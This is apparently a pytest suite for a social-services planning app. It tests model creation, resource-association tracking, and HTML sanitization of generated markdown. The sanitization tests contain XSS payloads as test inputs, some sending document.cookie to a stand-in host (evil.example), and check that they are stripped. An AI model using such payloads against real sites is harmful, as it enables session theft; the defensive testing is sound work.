from datetime import datetime, timezone
from unittest.mock import MagicMock
from uuid import uuid4

import pytest
from html_sanitizer import Sanitizer

from app.core.db import AsyncSession
from app.models.models import (
    Plan,
    PlanAsset,
    PlanGeneration,
    PlanGenerationResourceAssociation,
    ResourceAssociationAction,
    ResourceAssociationType,
    sanitize_markdown,
)


@pytest.mark.asyncio
async def test_create_plan(async_session: AsyncSession):
    new_plan = Plan(client_pseudo_id="client_1")
    async_session.add(new_plan)
    await async_session.commit()

    result = await async_session.get(Plan, new_plan.id)
    assert result is not None
    assert result.client_pseudo_id == "client_1"


@pytest.mark.asyncio
async def test_create_plan_asset(async_session: AsyncSession):
    new_plan = Plan(client_pseudo_id="client_1")
    async_session.add(new_plan)
    await async_session.commit()

    new_asset = PlanAsset(
        plan_id=new_plan.id,
        client_pseudo_id="client_1",
        filename="example.png",
        file_blob=b"fake_data",
        mimetype="image/png",
    )
    async_session.add(new_asset)
    await async_session.commit()

    result = await async_session.get(PlanAsset, new_asset.id)
    assert result is not None
    assert result.filename == "example.png"
    assert result.mimetype == "image/png"
    assert result.file_blob == b"fake_data"
    assert result.plan_id == new_plan.id


@pytest.mark.asyncio
async def test_create_plan_generation(async_session: AsyncSession):
    new_plan = Plan(client_pseudo_id="client_1")
    async_session.add(new_plan)
    await async_session.commit()

    new_generation = PlanGeneration(
        plan_id=new_plan.id,
        prompt="Test prompt",
        markdown_result="**Test result**",
    )
    async_session.add(new_generation)
    await async_session.commit()

    result = await async_session.get(PlanGeneration, new_generation.id)
    assert result is not None
    assert result.status == "not_started"
    assert result.prompt == "Test prompt"
    assert result.markdown_result == "**Test result**"
    assert result.plan_id == new_plan.id


def _make_event(
    resource_id: int,
    action: ResourceAssociationAction,
    action_at: datetime,
    section_title: str = "Housing",
    resource_type: ResourceAssociationType = ResourceAssociationType.COMMUNITY,
) -> PlanGenerationResourceAssociation:
    return PlanGenerationResourceAssociation(
        plan_generation_id=uuid4(),
        resource_id=resource_id,
        resource_type=resource_type,
        section_title=section_title,
        action=action,
        action_by="SYSTEM",
        action_at=action_at,
    )


def _gen_with_events(events: list):
    """Returns a mock PlanGeneration with the given resource_associations."""
    gen = MagicMock()
    gen.resource_associations = events
    return gen


def _call_property(gen) -> list:
    """Calls active_resource_associations directly, bypassing ORM instrumentation."""
    return PlanGeneration.active_resource_associations.fget(gen)


def test_active_resource_associations_returns_added_resources():
    gen = _gen_with_events(
        [
            _make_event(
                1,
                ResourceAssociationAction.ADD,
                datetime(2024, 1, 1, tzinfo=timezone.utc),
            ),
            _make_event(
                2,
                ResourceAssociationAction.ADD,
                datetime(2024, 1, 2, tzinfo=timezone.utc),
            ),
        ]
    )

    assert {a.resource_id for a in _call_property(gen)} == {1, 2}


def test_active_resource_associations_excludes_removed_resources():
    gen = _gen_with_events(
        [
            _make_event(
                1,
                ResourceAssociationAction.ADD,
                datetime(2024, 1, 1, tzinfo=timezone.utc),
            ),
            _make_event(
                1,
                ResourceAssociationAction.REMOVE,
                datetime(2024, 1, 2, tzinfo=timezone.utc),
            ),
        ]
    )

    assert _call_property(gen) == []


def test_active_resource_associations_re_added_resource_is_active():
    gen = _gen_with_events(
        [
            _make_event(
                1,
                ResourceAssociationAction.ADD,
                datetime(2024, 1, 1, tzinfo=timezone.utc),
            ),
            _make_event(
                1,
                ResourceAssociationAction.REMOVE,
                datetime(2024, 1, 2, tzinfo=timezone.utc),
            ),
            _make_event(
                1,
                ResourceAssociationAction.ADD,
                datetime(2024, 1, 3, tzinfo=timezone.utc),
            ),
        ]
    )

    active = _call_property(gen)

    assert len(active) == 1
    assert active[0].resource_id == 1


def test_active_resource_associations_reflects_latest_section_title():
    """When a resource is re-added to a different section, the new section is returned."""
    t1, t2, t3 = (datetime(2024, 1, d, tzinfo=timezone.utc) for d in (1, 2, 3))
    gen = _gen_with_events(
        [
            _make_event(1, ResourceAssociationAction.ADD, t1, section_title="Housing"),
            _make_event(
                1, ResourceAssociationAction.REMOVE, t2, section_title="Housing"
            ),
            _make_event(
                1, ResourceAssociationAction.ADD, t3, section_title="Employment"
            ),
        ]
    )

    active = _call_property(gen)

    assert active[0].section_title == "Employment"


def test_active_resource_associations_same_resource_in_multiple_sections():
    """A resource added to two different sections should appear as active in both."""
    t1, t2 = (datetime(2024, 1, d, tzinfo=timezone.utc) for d in (1, 2))
    gen = _gen_with_events(
        [
            _make_event(1, ResourceAssociationAction.ADD, t1, section_title="Housing"),
            _make_event(
                1, ResourceAssociationAction.ADD, t2, section_title="Employment"
            ),
        ]
    )

    active = _call_property(gen)

    assert len(active) == 2
    assert {a.section_title for a in active} == {"Housing", "Employment"}


def test_active_resource_associations_empty_ledger():
    gen = _gen_with_events([])

    assert _call_property(gen) == []


def test_active_resource_associations_community_and_digital_same_id_tracked_independently():
    """Community and digital resources sharing a numeric ID are treated as distinct entries."""
    t1 = datetime(2024, 1, 1, tzinfo=timezone.utc)
    gen = _gen_with_events(
        [
            _make_event(
                42,
                ResourceAssociationAction.ADD,
                t1,
                resource_type=ResourceAssociationType.COMMUNITY,
            ),
            _make_event(
                42,
                ResourceAssociationAction.ADD,
                t1,
                resource_type=ResourceAssociationType.DIGITAL,
            ),
        ]
    )

    active = _call_property(gen)

    assert len(active) == 2
    assert {a.resource_type for a in active} == {
        ResourceAssociationType.COMMUNITY,
        ResourceAssociationType.DIGITAL,
    }


def test_active_resource_associations_removing_digital_does_not_affect_community():
    """REMOVE on a DIGITAL resource must not deactivate the COMMUNITY resource with the same ID."""
    t1, t2 = (datetime(2024, 1, d, tzinfo=timezone.utc) for d in (1, 2))
    gen = _gen_with_events(
        [
            _make_event(
                42,
                ResourceAssociationAction.ADD,
                t1,
                resource_type=ResourceAssociationType.COMMUNITY,
            ),
            _make_event(
                42,
                ResourceAssociationAction.ADD,
                t1,
                resource_type=ResourceAssociationType.DIGITAL,
            ),
            _make_event(
                42,
                ResourceAssociationAction.REMOVE,
                t2,
                resource_type=ResourceAssociationType.DIGITAL,
            ),
        ]
    )

    active = _call_property(gen)

    assert len(active) == 1
    assert active[0].resource_type == ResourceAssociationType.COMMUNITY


def test_active_resource_associations_type_aware_dedup_within_same_type():
    """Two ADDs of the same (id, section, type) deduplicate to the latest event."""
    t1, t2 = (datetime(2024, 1, d, tzinfo=timezone.utc) for d in (1, 2))
    gen = _gen_with_events(
        [
            _make_event(
                7,
                ResourceAssociationAction.ADD,
                t1,
                resource_type=ResourceAssociationType.DIGITAL,
            ),
            _make_event(
                7,
                ResourceAssociationAction.ADD,
                t2,
                resource_type=ResourceAssociationType.DIGITAL,
            ),
        ]
    )

    active = _call_property(gen)

    assert len(active) == 1
    assert active[0].resource_type == ResourceAssociationType.DIGITAL
    assert active[0].action_at == t2


# ---------------------------------------------------------------------------
# PlanGeneration.markdown_result sanitization
# ---------------------------------------------------------------------------


async def _gen_markdown(async_session, markdown: str | None) -> str | None:
    new_plan = Plan(client_pseudo_id="client_1")
    async_session.add(new_plan)
    await async_session.commit()
    """Validate markdown through PlanGenerationBase so pydantic validators run."""
    return PlanGeneration(markdown_result=markdown, plan_id=new_plan.id).markdown_result


@pytest.mark.asyncio
async def test_sanitize_markdown_none_is_unchanged(async_session):
    assert await _gen_markdown(async_session, None) is None


@pytest.mark.asyncio
async def test_sanitize_markdown_plain_markdown_is_unchanged(async_session):
    text = (
        "## Housing Resources\n\n"
        "Here are some options to consider:\n\n"
        "- **Shelter First** – emergency housing assistance\n"
        "- *Community Housing* – long-term support program\n\n"
        "Contact your **case manager** for more details."
    )
    assert await _gen_markdown(async_session, text) == text


@pytest.mark.asyncio
async def test_sanitize_markdown_allowed_tags_wrap_markdown_content(async_session):
    # Structural tags wrap markdown lists and prose in real plan output
    markdown = (
        "## Employment\n\n"
        "<resources>\n"
        "- Job Training Center: Mon–Fri 9am–5pm\n"
        "- Resume Workshop: every Tuesday\n"
        "</resources>\n\n"
        "<note>Bring **photo ID** and work history documentation.</note>\n\n"
        "<annotations><annotation>Last reviewed: January 2024</annotation></annotations>"
    )
    result = await _gen_markdown(async_session, markdown)
    for tag in ("note", "resources", "annotation", "annotations"):
        assert f"<{tag}>" in result
        assert f"</{tag}>" in result
    assert "Job Training Center" in result
    assert "photo ID" in result


@pytest.mark.asyncio
async def test_sanitize_markdown_disallowed_html_stripped_from_markdown(async_session):
    # An attacker (or buggy LLM) injecting <div>/<p> into otherwise valid markdown
    markdown = (
        "## Support Services\n\n"
        "<div>Contact your local office for assistance.</div>\n\n"
        "<p>Additional resources are available online.</p>"
    )
    result = await _gen_markdown(async_session, markdown)
    assert "<div>" not in result
    assert "<p>" not in result
    assert "Contact your local office" in result
    assert "Additional resources" in result


@pytest.mark.asyncio
async def test_sanitize_markdown_script_tag_is_removed(async_session):
    # Script injected between markdown sections
    markdown = (
        "## Benefits\n\n"
        "<script>fetch('https://evil.example/steal?c='+document.cookie)</script>\n\n"
        "- **SNAP** – food assistance program\n"
        "- Medicaid – health coverage"
    )
    result = await _gen_markdown(async_session, markdown)
    assert "<script>" not in result
    assert "fetch(" not in result
    assert "SNAP" in result
    assert "Medicaid" in result


@pytest.mark.asyncio
async def test_sanitize_markdown_inline_event_handler_is_stripped(async_session):
    # Event handler on an otherwise-allowed structural tag
    result = await _gen_markdown(
        async_session,
        '<note onmouseover="stealData()">Call ahead to confirm availability.</note>',
    )
    assert "onmouseover" not in result
    assert "<note>" in result
    assert "Call ahead to confirm availability." in result


@pytest.mark.asyncio
async def test_sanitize_markdown_javascript_url_is_stripped(async_session):
    # JS URL smuggled inside a resources block
    markdown = (
        "<resources>\n"
        "<a href=\"javascript:void(document.location='https://evil.example/'+document.cookie)\">"
        "Apply here</a>\n"
        "</resources>"
    )
    result = await _gen_markdown(async_session, markdown)
    assert "javascript:" not in result
    assert "<resources>" in result


@pytest.mark.asyncio
async def test_sanitize_markdown_style_tag_is_removed(async_session):
    # Style tag injected before a markdown section heading
    markdown = (
        "<style>body { display: none !important; }</style>\n\n"
        "## Reentry Resources\n\n"
        "The following services are available in your area."
    )
    result = await _gen_markdown(async_session, markdown)
    assert "<style>" not in result
    assert "display: none" not in result
    assert "Reentry Resources" in result
    assert "services are available" in result


@pytest.mark.asyncio
async def test_sanitize_markdown_nested_disallowed_inside_allowed_tag(async_session):
    # Script nested inside a <note> — tag must survive but inner script must not
    markdown = (
        "<note>"
        "<script>exfil(document.cookie)</script>"
        "**Important:** verify eligibility before applying."
        "</note>"
    )
    result = await _gen_markdown(async_session, markdown)
    assert "<script>" not in result
    assert "exfil(" not in result
    assert "<note>" in result
    assert "verify eligibility" in result


def test_html_sanitizer_allowed_tags_behaviour():
    """Verify html-sanitizer preserves all five structural tags including annotation.

    Unlike nh3 (which treats <annotation> as a MathML element and strips it),
    html-sanitizer uses lxml and treats all listed tags as plain HTML elements.
    """
    allowed = {"note", "notes", "resources", "annotation", "annotations"}
    sanitizer = Sanitizer(
        {"tags": allowed, "attributes": {}, "empty": set(), "separate": set()}
    )
    html = (
        "<note>Call ahead to confirm hours.</note>"
        "<notes>Multiple locations available.</notes>"
        "<resources>- Downtown Office\n- Eastside Center</resources>"
        "<annotations><annotation>Last reviewed: 2024-01-15</annotation></annotations>"
    )
    result = sanitizer.sanitize(html)

    for tag in allowed:
        assert f"<{tag}>" in result, f"expected <{tag}> to be preserved"
        assert f"</{tag}>" in result


def test_sanitize_markdown_utility_strips_threats_in_plan_context():
    """Direct test of sanitize_markdown: threats embedded in realistic plan output."""
    plan_with_threats = (
        "## Housing\n\n"
        "<script>navigator.sendBeacon('https://evil.example/', document.cookie)</script>\n\n"
        '<div onclick="stealData()">Temporary shelter options:</div>\n\n'
        "<resources>\n"
        "- Shelter A – 24/7 intake\n"
        '<a href="javascript:void(0)">Apply online</a>\n'
        "</resources>\n\n"
        "<note>**Bring ID** to all appointments.</note>"
    )
    result = sanitize_markdown(plan_with_threats)
    assert "<script>" not in result
    assert "sendBeacon" not in result
    assert "<div>" not in result
    assert "onclick" not in result
    assert "javascript:" not in result
    # Safe content preserved
    assert "Shelter A" in result
    assert "<resources>" in result
    assert "<note>" in result
    assert "Bring ID" in result


@pytest.mark.asyncio
async def test_plan_generation_sanitizes_markdown_on_create(async_session):
    """Integration: PlanGeneration persists sanitized markdown in a realistic plan."""
    plan = Plan(client_pseudo_id="sanitize_integration")
    async_session.add(plan)
    await async_session.commit()

    raw_markdown = (
        "## Employment\n\n"
        "<script>xss()</script>\n\n"
        "<resources>\n"
        "- **Job Training Center** – Mon–Fri 9am–5pm\n"
        "- Resume Workshop – every Tuesday\n"
        "</resources>\n\n"
        "<note>Bring your **résumé** and two references.</note>"
    )
    gen = PlanGeneration(plan_id=plan.id, markdown_result=raw_markdown)
    async_session.add(gen)
    await async_session.commit()
    await async_session.refresh(gen)

    assert "<script>" not in gen.markdown_result
    assert "xss()" not in gen.markdown_result
    assert "<resources>" in gen.markdown_result
    assert "Job Training Center" in gen.markdown_result
    assert "<note>" in gen.markdown_result
    assert "résumé" in gen.markdown_result
